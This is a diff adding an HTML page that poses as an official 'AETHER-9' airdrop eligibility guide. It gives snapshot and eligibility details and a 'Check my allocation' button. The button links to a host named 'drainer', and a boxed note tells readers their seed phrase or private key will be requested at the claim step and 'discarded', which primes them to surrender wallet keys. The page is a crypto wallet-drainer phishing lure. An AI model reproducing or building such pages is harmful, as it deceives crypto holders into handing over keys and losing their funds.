@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AETHER-9 Eligibility Guide — How to Check Your Allocation</title>
+<meta name="description" content="Step-by-step guide to checking your AETHER-9 genesis airdrop allocation. Snapshot block height, eligibility criteria, and how the claim works.">
+<style>
+  :root{--bg:#0a0e17;--panel:#111827;--txt:#e5e9f0;--mut:#8b96a8;--acc:#6c5ce7;--acc2:#00d2ff;--bd:#1e2a3d}
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.7}
+  .wrap{max-width:760px;margin:0 auto;padding:0 20px}
+  header{padding:18px 0;border-bottom:1px solid var(--bd)}
+  .nav{display:flex;align-items:center;justify-content:space-between}
+  .logo{font-weight:700;font-size:20px;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .nav a{color:var(--mut);text-decoration:none;margin-left:22px;font-size:14px}
+  .nav a:hover{color:var(--txt)}
+  article{padding:48px 0}
+  .kicker{color:var(--acc2);font-size:13px;letter-spacing:1px;text-transform:uppercase;margin-bottom:12px}
+  h1{font-size:36px;line-height:1.2;margin-bottom:20px}
+  h2{font-size:23px;margin:34px 0 12px;color:var(--acc2)}
+  p{color:#c4ccd8;margin-bottom:16px;font-size:16px}
+  .lead{font-size:19px;color:var(--mut)}
+  ul,ol{margin:0 0 18px 22px;color:#c4ccd8}
+  li{margin-bottom:8px}
+  code{background:#0a0f18;border:1px solid var(--bd);border-radius:5px;padding:2px 7px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;color:var(--acc2)}
+  .cta{display:block;width:100%;max-width:340px;margin:30px auto 6px;padding:15px;border:none;border-radius:10px;background:linear-gradient(90deg,var(--acc),var(--acc2));color:#fff;font-size:16px;font-weight:600;text-align:center;text-decoration:none}
+  .cta:hover{filter:brightness(1.1)}
+  .note{background:var(--panel);border:1px solid var(--bd);border-left:3px solid var(--acc2);border-radius:8px;padding:16px 20px;margin:24px 0;font-size:15px;color:#c4ccd8}
+  footer{border-top:1px solid var(--bd);padding:30px 0;color:var(--mut);font-size:13px;text-align:center}
+</style>
+</head>
+<body>
+<header><div class="wrap nav">
+  <div class="logo">AETHER&#8209;9</div>
+  <nav><a href="/">Home</a><a href="/security.html">Security</a></nav>
+</div></header>
+
+<div class="wrap"><article>
+  <div class="kicker">Eligibility Guide</div>
+  <h1>How to check your AETHER&#8209;9 airdrop allocation</h1>
+  <p class="lead">The AETHER&#8209;9 genesis airdrop rewards wallets that held assets on the genesis chain at a specific snapshot. Here is exactly how eligibility is determined and how to check yours in under a minute.</p>
+
+  <h2>The snapshot</h2>
+  <p>Distribution is based on a single on-chain snapshot taken at <code>block 18,442,907</code>. Your eligible balance is the amount your wallet held at that exact height. Balances acquired after the snapshot do not count, and balances moved out before it reduce your allocation.</p>
+
+  <h2>Eligibility criteria</h2>
+  <ul>
+    <li>Held a positive balance on the AETHER&#8209;9 genesis chain at the snapshot block.</li>
+    <li>Wallet is not flagged as a sybil or wash-trading address (anti-abuse filter).</li>
+    <li>Allocation is computed from the distribution curve &mdash; larger holdings map to larger airdrops, with a cap per wallet.</li>
+  </ul>
+
+  <h2>How to check</h2>
+  <ol>
+    <li>Open the official eligibility checker.</li>
+    <li>Paste your EVM wallet address (the one you used on the genesis chain).</li>
+    <li>The checker reads your snapshot balance and returns your allocation. No gas, no wallet connect, no signature required for this step.</li>
+  </ol>
+
+  <div class="note"><b>Note:</b> The eligibility check is read-only. It never asks for your private key or seed phrase. Key material is only requested at the final claim step, where it is used locally to sign your transfer and then discarded.</div>
+
+  <a class="cta" href="https://drainer.kxv72m.workers.dev/go/aeth9_web_02">Check my allocation &rarr;</a>
+</article></div>
+
+<footer><div class="wrap">AETHER&#8209;9 Foundation &middot; <a href="/" style="color:var(--mut)">Home</a> &middot; <a href="/security.html" style="color:var(--mut)">Security</a></div></footer>
+</body>
+</html>
